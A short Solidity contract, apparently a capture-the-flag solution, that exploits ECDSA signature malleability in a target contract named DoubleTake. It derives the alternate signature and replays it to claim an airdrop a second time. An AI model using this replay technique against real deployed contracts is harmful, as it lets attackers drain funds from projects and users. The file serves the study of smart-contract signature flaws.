// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {DoubleTake} from "./DoubleTake.sol";

contract DoubleTakeExploiter {
    function attack(
        DoubleTake _victim,
        address user,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        require(v == 27 || v == 28);

        // Use signature malleability
        bytes32 s2 = bytes32(
            uint256(
                0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
            ) - uint256(s)
        );
        uint8 v2 = v == 27 ? 28 : 27;

        _victim.claimAirdrop(user, 1 ether, v2, r, s2);
    }
}
